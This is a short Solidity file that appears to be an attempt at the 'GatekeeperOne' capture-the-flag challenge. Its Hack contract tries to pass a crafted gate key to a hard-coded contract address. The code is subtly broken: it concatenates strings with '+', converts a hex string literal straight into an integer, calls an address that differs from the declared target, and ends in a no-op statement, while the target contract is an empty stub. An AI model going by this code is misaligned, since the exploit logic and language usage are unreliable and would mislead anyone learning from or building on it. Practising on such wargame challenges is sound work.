// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';


contract GatekeeperOne {
    constructor() public{
        
    }

}

contract Hack {
    GatekeeperOne gateKeeper = GatekeeperOne(0xffD259921223B835d943Badd970044Cc5cd2cC71);
    bytes8 b = bytes8(uint64("0xDC8dA71cA6aA535fBFCAD46bF0d7dB25dE446258"));
    string data2 = "enter(" + b + ")";
    address payable addr = address(0xFf14Aab33231eB0D193a8308D0fA0dc6ca7014d2);
    
    function hack()public {
        (bool result, bytes memory data) = addr.call{value:msg.value}(data2);
        if(result)
        data;
        
    }
}